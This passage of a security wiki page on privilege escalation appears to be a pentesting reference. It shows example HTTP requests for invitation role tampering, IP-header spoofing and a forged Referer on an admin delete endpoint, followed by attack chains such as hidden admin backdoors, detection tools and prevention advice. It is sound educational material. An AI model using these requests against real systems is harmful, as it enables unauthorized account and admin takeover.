+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">engine</span>.<span style="color:#a6e22e">queue</span>(<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">gate</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;race1&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">engine</span>.<span style="color:#a6e22e">openGate</span>(<span style="color:#e6db74">&#39;race1&#39;</span>)
+</span></span></code></pre></div><h3 id="12-invitation--registration-abuse">
+  12. Invitation &amp; Registration Abuse
+  <a class="anchor" href="#12-invitation--registration-abuse">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether invitation flows, registration endpoints, or account creation APIs allow role manipulation.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Intercept</span> <span style="color:#a6e22e">invitation</span> <span style="color:#a6e22e">acceptance</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">modify</span> <span style="color:#a6e22e">role</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">invitations</span><span style="color:#f92672">/</span><span style="color:#a6e22e">accept</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;invitationToken&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;abc123&#34;</span>, <span style="color:#e6db74">&#34;role&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">-</span><span style="color:#a6e22e">invitation</span> (<span style="color:#a6e22e">user</span> <span style="color:#a6e22e">without</span> <span style="color:#a6e22e">user</span><span style="color:#f92672">-</span><span style="color:#a6e22e">management</span> <span style="color:#a6e22e">access</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">invitations</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Authorization</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Bearer</span> <span style="color:#a6e22e">$LOW_PRIV_TOKEN</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Content</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">application</span><span style="color:#f92672">/</span><span style="color:#a6e22e">json</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;email&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;attacker@evil.com&#34;</span>, <span style="color:#e6db74">&#34;role&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;owner&#34;</span>}
+</span></span></code></pre></div><h3 id="13-ip-based-access-control-bypass">
+  13. IP-Based Access Control Bypass
+  <a class="anchor" href="#13-ip-based-access-control-bypass">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether IP-based restrictions can be bypassed with header manipulation.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/admin \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Forwarded-For: 127.0.0.1&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Real-IP: 127.0.0.1&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Originating-IP: 127.0.0.1&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Remote-IP: 127.0.0.1&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Client-IP: 127.0.0.1&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span></code></pre></div><h3 id="14-referer-based-access-control-bypass">
+  14. Referer-Based Access Control Bypass
+  <a class="anchor" href="#14-referer-based-access-control-bypass">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether forging the Referer header grants access to restricted sub-pages.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Admin</span> <span style="color:#a6e22e">sub</span><span style="color:#f92672">-</span><span style="color:#a6e22e">page</span> <span style="color:#a6e22e">checks</span> <span style="color:#a6e22e">Referer</span> <span style="color:#66d9ef">for</span> <span style="color:#960050;background-color:#1e0010">/admin</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/admin/deleteUser \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Referer: https://target.com/admin&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$REGULAR_USER_SESSION&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#34;userId=victim123&#34;</span>
+</span></span></code></pre></div><hr>
+<p>**Advanced Attack Scenarios</p>
+<ol>
+<li>IDOR + XSS → Account Takeover**
+<strong>Flow:</strong> Discover IDOR on <code>/api/users/{id}/settings</code> that returns API keys → find stored XSS on the platform → XSS payload fetches victim&rsquo;s API key via IDOR → attacker takes over victim&rsquo;s account using the API key.
+<strong>Takeaway:</strong> IDOR on sensitive fields (tokens, keys, password hashes) combined with any code execution vulnerability escalates to full account takeover.
+<strong>2. Email Confirmation Bypass + SSO → Shop Owner Takeover</strong>
+<strong>Flow:</strong> Application uses SSO via <code>myshopify.com</code>. Attacker bypasses email confirmation during linked account creation → now authenticated as the shop owner via SSO without ever confirming email ownership
+<strong>Takeaway:</strong> Email verification bypasses in SSO-linked flows can grant instant access to any linked account.
+<strong>3. OAuth Scope Confusion → Read Private DMs</strong>
+<strong>Flow:</strong> OAuth permissions screen incorrectly displays granted permissions. Application requests DM read access but the consent screen doesn&rsquo;t show it → user authorizes → attacker&rsquo;s app reads private DMs
+<strong>Takeaway:</strong> Always verify that OAuth consent screens accurately reflect the actual scopes being granted.
+<strong>4. GitHub App Installation → Organization Owner Escalation</strong>
+<strong>Flow:</strong> Attacker creates a GitHub App with specific installation permissions → tricks org admin into installing it → app leverages installation token to escalate attacker&rsquo;s role to organization owner.
+<strong>Takeaway:</strong> Third-party app installations in organizational contexts can cascade into full administrative takeover.
+<strong>5. Stored XSS + File Upload → Workspace Takeover</strong>
+<strong>Flow:</strong> Application allows file upload with insufficient content validation → attacker uploads SVG/HTML with stored XSS payload → when admin views the file, XSS executes in their context → script modifies workspace settings, adds attacker as admin → full workspace takeover.
+<strong>Takeaway:</strong> XSS in admin-viewable contexts (file previews, comments, notifications) is particularly dangerous because it inherits the admin&rsquo;s privileges.
+<strong>6. Mass Assignment + Registration → Instant Admin</strong>
+<strong>Flow:</strong> User registration endpoint auto-maps all JSON fields to the user model → attacker adds <code>&quot;role&quot;: &quot;admin&quot;</code> to the registration request → account created with admin privileges → immediate full control.
+<strong>Takeaway:</strong> Mass assignment during registration is the fastest path from zero to admin.
+<strong>7. Hidden Admin Account → Persistent Backdoor</strong>
+<strong>Flow:</strong> Attacker gains temporary admin access (via any escalation method) → creates a hidden admin account that doesn&rsquo;t appear in user management listing → original vulnerability is patched but the hidden account persists → attacker maintains permanent admin access.
+<strong>Takeaway:</strong> Post-exploitation persistence through hidden accounts can survive vulnerability remediation.
+<strong>8. IDOR on Translation/Content Approval → Content Manipulation</strong>
+<strong>Flow:</strong> User discovers that the <code>/translations/unapprove/</code> endpoint doesn&rsquo;t validate the caller&rsquo;s role → any authenticated user can unapprove any approved translation → attacker systematically unapproves legitimate content or approves malicious translations .
+<strong>Takeaway:</strong> Content moderation actions (approve, reject, publish, pin, unpin) are frequently missing authorization checks.
+<strong>9. AWS Lambda/CloudFront Extension → Cloud Privilege Escalation</strong>
+<strong>Flow:</strong> Misconfigured AWS Lambda or CloudFront extension grants overly permissive IAM role → service can access secrets, modify S3 buckets, or assume roles across accounts → lateral movement to other cloud services.
+<strong>Takeaway:</strong> Cloud service misconfigurations that grant excessive IAM permissions create privilege escalation paths from the web layer to the cloud infrastructure</li>
+</ol>
+<hr>
+<h2 id="detection-techniques">
+  <strong>Detection Techniques</strong>
+  <a class="anchor" href="#detection-techniques">#</a>
+</h2>
+<h3 id="manual">
+  <strong>Manual</strong>
+  <a class="anchor" href="#manual">#</a>
+</h3>
+<p>• <strong>Proxy (Burp Suite / ZAP):</strong> Intercept all requests, swap session tokens between users of different roles, observe responses
+• <strong>Browser DevTools:</strong> Inspect cookies, hidden fields, localStorage/sessionStorage for role data
+• <strong>Two-browser technique:</strong> Log in as admin in one browser, regular user in another; replay admin requests with user&rsquo;s cookies
+• <strong>API documentation review:</strong> Compare documented endpoints against role-specific access
+• <strong>JavaScript source analysis:</strong> Search for admin URLs, hidden endpoints, role checks in client-side code</p>
+<h3 id="automated">
+  <strong>Automated</strong>
+  <a class="anchor" href="#automated">#</a>
+</h3>
+<p>• <strong>Burp Authorize extension:</strong> Automatically replays every request with a lower-privileged session and compares responses
+• <strong>Burp Auto Repeater:</strong> Automatically duplicates requests with modified headers/parameters
+• <strong>OWASP ZAP Access Control:</strong> Map application with different user roles, compare access matrices
+• <strong>Nuclei templates:</strong> <code>nuclei -u https://target.com -tags auth,idor,privilege-escalation</code>
+• <strong>Arjun:</strong> Discover hidden parameters that might influence authorization
+• <strong>ParamSpider / GAP:</strong> Extract parameters from JavaScript files for testing
+• <strong>jwt_tool:</strong> Automated JWT vulnerability scanning
+• <strong>Autorize:</strong> Burp extension for automated authorization testing</p>
+<hr>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Category</strong></th>
+<th><strong>Tool</strong></th>
+<th><strong>Purpose</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Authorization Testing</strong></td>
+<td>Burp Authorize,Burp Auto Repeater,OWASP ZAP</td>
+<td>Automated authorization bypass detection</td>
+</tr>
+<tr>
+<td><strong>IDOR Scanning</strong></td>
+<td>Burp Intruder,ffuf,Autorize</td>
+<td>Sequential ID enumeration.</td>
+</tr>
+<tr>
+<td>Fast parameter fuzzing and ID enumeration.</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Automated BOLA/IDOR detection.</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>JWT Testing</strong></td>
+<td>hashcat (-m 16500)</td>
+<td>JWT vulnerability scanner (none alg, weak secret, claim tampering).</td>
+</tr>
+<tr>
+<td>JWT HMAC secret brute-forcing</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>GraphQL</strong></td>
+<td>InQL (Burp)</td>
+<td>GraphQL introspection and query generation</td>
+</tr>
+<tr>
+<td><strong>GraphQL</strong></td>
+<td>Altair</td>
+<td>Visual schema exploration.</td>
+</tr>
+<tr>
+<td>GraphQL client for manual testing</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Parameter Discovery</strong></td>
+<td>Arjun,ParamSpider</td>
+<td>Hidden parameter finder.</td>
+</tr>
+<tr>
+<td>Parameter extraction from web archives</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Endpoint Discovery</strong></td>
+<td>ffuf / gobuster,dirsearch</td>
+<td>Admin panel and hidden path brute-forcing.</td>
+</tr>
+<tr>
+<td>Web path scanner</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>General Scanners</strong></td>
+<td>Nikto</td>
+<td>Template-based authorization and misconfig checks.</td>
+</tr>
+<tr>
+<td>Web server vulnerability scanner</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Race Conditions</strong></td>
+<td>Turbo Intruder</td>
+<td>Concurrent request sending for race conditions</td>
+</tr>
+<tr>
+<td><strong>API Testing</strong></td>
+<td>Postman / Insomnia</td>
+<td>API request crafting and collection management</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="impact">
+  Impact
+  <a class="anchor" href="#impact">#</a>
+</h2>
+<ul>
+<li><strong>Account Takeover:</strong> Full compromise of victim accounts via credential theft or horizontal IDOR.</li>
+<li><strong>Data Breach:</strong> Mass exfiltration of sensitive information through bulk enumeration and unauthorized access.</li>
+<li><strong>Unauthorized Admin Access:</strong> Low-level users gaining the ability to manage system users, settings, and core configurations.</li>
+<li><strong>Financial Fraud:</strong> Bypassing payment gateways, altering transactions, or accessing private financial records.</li>
+<li><strong>Content Manipulation:</strong> Illegitimate publishing, approval, or alteration of digital content and user data.</li>
+<li><strong>Persistent Backdoors:</strong> The creation of hidden administrative accounts that evade detection and survive patching.</li>
+<li><strong>Cloud Compromise:</strong> Escalating from web-layer vulnerabilities to full infrastructure takeover via abused IAM roles.</li>
+<li><strong>Compliance Violations:</strong> Security breaches resulting in severe regulatory penalties (e.g., GDPR, HIPAA, PCI-DSS).</li>
+<li><strong>Reputation Damage:</strong> Significant loss of customer trust and brand value due to publicized authorization failures.</li>
+<li><strong>Business Logic Abuse:</strong> Exploiting application workflows to access paid features for free or bypass mandatory approvals.</li>
+</ul>
+<hr>
+<h2 id="prevention-techniques">
+  <strong>Prevention Techniques</strong>
+  <a class="anchor" href="#prevention-techniques">#</a>
+</h2>
+<h3 id="architecture--design">
+  <strong>Architecture &amp; Design</strong>
+  <a class="anchor" href="#architecture--design">#</a>
+</h3>
+<p>• <strong>Deny by default:</strong> Unless a resource is explicitly public, deny all access and require explicit grants
+• <strong>Use indirect references:</strong> Map user-facing IDs to internal IDs via a per-session mapping table; never expose database primary keys directly</p>
+<h3 id="implementation">
+  <strong>Implementation</strong>
+  <a class="anchor" href="#implementation">#</a>
+</h3>
+<p>• <strong>Server-side Validation:</strong> All authorization decisions must be made server-side; never trust client-side role indicators (cookies, hidden fields, JWTs without server validation)
+• <strong>Strong JWT implementation:</strong> Use RS256 with proper key management; validate <code>alg</code> header against a whitelist; enforce short expiration; implement token revocation
+• <strong>Object-level authorization:</strong> On every CRUD operation, verify the authenticated user&rsquo;s relationship to the object being accessed</p>
+<h3 id="testing--operations">
+  <strong>Testing &amp; Operations</strong>
+  <a class="anchor" href="#testing--operations">#</a>
+</h3>
+<p>• <strong>Automated authorization testing:</strong> Include authorization matrix tests in CI/CD pipelines
+• <strong>Rate limiting and logging:</strong> Rate-limit sensitive endpoints; log all authorization failures and alert on patterns (sequential ID enumeration, repeated 403s)
+• <strong>Session management:</strong> Invalidate sessions on logout; rotate session tokens on privilege changes;</p>
+<hr>
+<h2 id="good-to-read">
+  <strong>Good to Read</strong>
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<p>• <a href="https://hackerone.com/reports/791775" target="_blank" rel="noreferrer noopener nofollow">Shopify — Email Confirmation Bypass → Full Shop Owner Takeover (HackerOne #791775)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — SSO-linked email bypass for complete privilege escalation to shop owner.
+• <a href="https://hackerone.com/reports/927567" target="_blank" rel="noreferrer noopener nofollow">Shopify — Publish Paid Theme Without Purchase (HackerOne #927567)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Business logic bypass allowing unpaid theme deployment.
+• <a href="https://hackerone.com/reports/434763" target="_blank" rel="noreferrer noopener nofollow">X/xAI — OAuth DM Access Without Permission (HackerOne #434763)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Consent screen misrepresentation granting unauthorized DM read.
+• <a href="https://hackerone.com/reports/1596663" target="_blank" rel="noreferrer noopener nofollow">Reddit — Hidden Admin Account Persistence (HackerOne #1596663)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Invisible admin account that survives owner review.
+• <a href="https://hackerone.com/reports/13959" target="_blank" rel="noreferrer noopener nofollow">Automattic — Privilege Escalation (HackerOne #13959)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Early classic privilege escalation report.
+• <a href="https://medium.com/@0xtanner/using-a-github-app-to-escalate-to-an-organization-owner-for-a-10-000-bounty" target="_blank" rel="noreferrer noopener nofollow">GitHub App to Organization Owner Escalation ($10K bounty)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — GitHub App installation exploit leading to org owner.
+• <a href="https://samcurry.net/privilege-escalation-in-partners-portal-to-admin-access" target="_blank" rel="noreferrer noopener nofollow">Partners Portal Admin Access — Youssef Sammouda</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Partner portal authorization bypass.</p>
+<p>• <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation" target="_blank" rel="noreferrer noopener nofollow">OWASP WSTG — Testing for Privilege Escalation</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Test methodology and examples.
+• <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment" target="_blank" rel="noreferrer noopener nofollow">OWASP — Mass Assignment</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://portswigger.net/web-security/access-control" target="_blank" rel="noreferrer noopener nofollow">PortSwigger — Access Control Vulnerabilities and Privilege Escalation</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Comprehensive guide with labs.
+• <a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noreferrer noopener nofollow">PortSwigger — JWT Attacks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — JWT vulnerability guide.
+• <a href="https://portswigger.net/web-security/oauth" target="_blank" rel="noreferrer noopener nofollow">PortSwigger — OAuth Authentication Vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — OAuth exploitation techniques.
+• <a href="https://book.hacktricks.wiki/en/pentesting-web/idor.html" target="_blank" rel="noreferrer noopener nofollow">HackTricks — IDOR (Insecure Direct Object Reference)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Practical IDOR testing methodology.
+• <a href="https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html" target="_blank" rel="noreferrer noopener nofollow">HackTricks — Registration &amp; Takeover Vulnerabilities</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Signup flow exploitation.
+• <a href="https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/" target="_blank" rel="noreferrer noopener nofollow">CrowdStrike — Privilege Escalation Prevention Guide (2022)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://knowledge-base.secureflag.com/vulnerabilities/broken_access_control/privilege_escalation.html" target="_blank" rel="noreferrer noopener nofollow">SecureFlag — Privilege Escalation Knowledge Base</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"> — Educational resource with code examples.</p>
+<hr>
+<h2 id="references">
+  <strong>References</strong>
+  <a class="anchor" href="#references">#</a>
+</h2>
+<p>• <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/Top10/A01_2021-Broken_Access_Control/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://portswigger.net/web-security/access-control" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/access-control</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://portswigger.net/web-security/access-control/idor" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/access-control/idor</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/jwt</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://portswigger.net/web-security/oauth" target="_blank" rel="noreferrer noopener nofollow">https://portswigger.net/web-security/oauth</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://book.hacktricks.wiki/en/pentesting-web/idor.html" target="_blank" rel="noreferrer noopener nofollow">https://book.hacktricks.wiki/en/pentesting-web/idor.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html" target="_blank" rel="noreferrer noopener nofollow">https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">
+• <a href="https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/" target="_blank" rel="noreferrer noopener nofollow">https://www.crowdstrike.com/cybersecurity-101/privilege-escalation/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Privilege%20Escalation%20%28Horizontal%20&amp;%20Vertical%29.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#privilege-escalation-horizontal--vertical">Privilege Escalation (Horizontal &amp; Vertical)</a>
+      <ul>
+        <li><a href="#understanding-privilege-escalation">Understanding Privilege Escalation</a></li>
+        <li><a href="#types-of-privilege-escalation-vulnerabilities">Types of Privilege Escalation Vulnerabilities</a>
+          <ul>
+            <li><a href="#1-insecure-direct-object-references-idor--broken-object-level-authorization-bola">1. Insecure Direct Object References (IDOR) / Broken Object-Level Authorization (BOLA)</a></li>
+            <li><a href="#2-broken-function-level-authorization-bfla">2. Broken Function-Level Authorization (BFLA)</a></li>
+            <li><a href="#3-parameter-based-access-control-manipulation">3. Parameter-Based Access Control Manipulation</a></li>
+            <li><a href="#4-mass-assignment--auto-binding">4. Mass Assignment / Auto-Binding</a></li>
+            <li><a href="#5-jwt--token-manipulation">5. JWT &amp; Token Manipulation</a></li>
+            <li><a href="#6-oauth--sso-privilege-escalation">6. OAuth &amp; SSO Privilege Escalation</a></li>
+            <li><a href="#7-multi-step-process-bypass">7. Multi-Step Process Bypass</a></li>
+            <li><a href="#8-referer-based-access-control">8. Referer-Based Access Control</a></li>
+            <li><a href="#9-url--path-manipulation-bypass">9. URL &amp; Path Manipulation Bypass</a></li>
+            <li><a href="#10-unprotected-functionality--admin-panel-exposure">10. Unprotected Functionality &amp; Admin Panel Exposure</a></li>
+            <li><a href="#11-graphql-authorization-bypass">11. GraphQL Authorization Bypass</a></li>
+            <li><a href="#12-api-key--token-scope-escalation">12. API Key &amp; Token Scope Escalation</a></li>
+            <li><a href="#13-hidden-admin-account--persistence">13. Hidden Admin Account &amp; Persistence</a></li>
+            <li><a href="#14-registration--invitation-flow-abuse">14. Registration &amp; Invitation Flow Abuse</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surfaces">Attack Surfaces</a></li>
+        <li><a href="#exploitation-and-testing-techniques">Exploitation and Testing Techniques</a>
+          <ul>
+            <li><a href="#1-idor--bola-testing">1. IDOR / BOLA Testing</a></li>
+            <li><a href="#2-vertical-privilege-escalation">2. Vertical Privilege Escalation</a></li>
+            <li><a href="#3-parameter-manipulation">3. Parameter Manipulation</a></li>
+            <li><a href="#4-mass-assignment-testing">4. Mass Assignment Testing</a></li>
+            <li><a href="#5-jwt-manipulation">5. JWT Manipulation</a></li>
+            <li><a href="#6-http-method--header-bypass">6. HTTP Method &amp; Header Bypass</a></li>
+            <li><a href="#7-url-path-bypass">7. URL Path Bypass</a></li>
+            <li><a href="#8-multi-step-process-bypass">8. Multi-Step Process Bypass</a></li>
+            <li><a href="#9-graphql-introspection--authorization-testing">9. GraphQL Introspection &amp; Authorization Testing</a></li>
+            <li><a href="#10-oauth--sso-testing">10. OAuth &amp; SSO Testing</a></li>
+            <li><a href="#11-race-condition-privilege-escalation">11. Race Condition Privilege Escalation</a></li>
+            <li><a href="#12-invitation--registration-abuse">12. Invitation &amp; Registration Abuse</a></li>
+            <li><a href="#13-ip-based-access-control-bypass">13. IP-Based Access Control Bypass</a></li>
+            <li><a href="#14-referer-based-access-control-bypass">14. Referer-Based Access Control Bypass</a></li>
+          </ul>
+        </li>
+        <li><a href="#detection-techniques"><strong>Detection Techniques</strong></a>
+          <ul>
+            <li><a href="#manual"><strong>Manual</strong></a></li>
+            <li><a href="#automated"><strong>Automated</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#prevention-techniques"><strong>Prevention Techniques</strong></a>
+          <ul>
+            <li><a href="#architecture--design"><strong>Architecture &amp; Design</strong></a></li>
+            <li><a href="#implementation"><strong>Implementation</strong></a></li>
+            <li><a href="#testing--operations"><strong>Testing &amp; Operations</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#good-to-read"><strong>Good to Read</strong></a></li>
+        <li><a href="#references"><strong>References</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
